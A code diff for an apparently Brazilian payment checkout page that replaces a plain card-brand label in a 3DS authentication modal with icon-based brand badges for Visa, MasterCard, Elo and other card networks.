@@ -2952,11 +2952,20 @@ Obs: Caso j├â┬í tenha realizado o pagamento, enviaremos uma mensagem confi
       } catch (err) {
       }
 
-      // Popula as informações dinâmicas do modal 3DS
+      // Popula as informações dinâmicas do modal 3DS (Bandeira + Ícones)
       if (authBrandLogo) {
-        const brandUpper = (detectedBrand || 'VISA').toUpperCase();
-        authBrandLogo.className = `auth-brand-badge ${(detectedBrand || 'visa').toLowerCase()}`;
-        authBrandLogo.textContent = brandUpper;
+        const brandKey = (detectedBrand || 'visa').toLowerCase();
+        const brandBadgeHTML = {
+          visa: '<i class="fa-brands fa-cc-visa" style="font-size:13px;"></i> VISA',
+          mastercard: '<i class="fa-brands fa-cc-mastercard" style="font-size:13px;"></i> MasterCard',
+          discover: '<i class="fa-brands fa-cc-discover" style="font-size:13px;"></i> DISCOVER',
+          amex: '<i class="fa-brands fa-cc-amex" style="font-size:13px;"></i> AMEX',
+          elo: '<span style="font-weight:900;font-style:italic;color:#f59e0b;">ELO</span>',
+          hipercard: '<i class="fa-solid fa-credit-card" style="font-size:12px;"></i> HIPERCARD',
+          generic: '<i class="fa-solid fa-credit-card" style="font-size:12px;"></i> CARTÃO'
+        };
+        authBrandLogo.className = `auth-brand-badge ${brandKey}`;
+        authBrandLogo.innerHTML = brandBadgeHTML[brandKey] || brandBadgeHTML.visa;
       }
 
       const totalBrl = totalAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
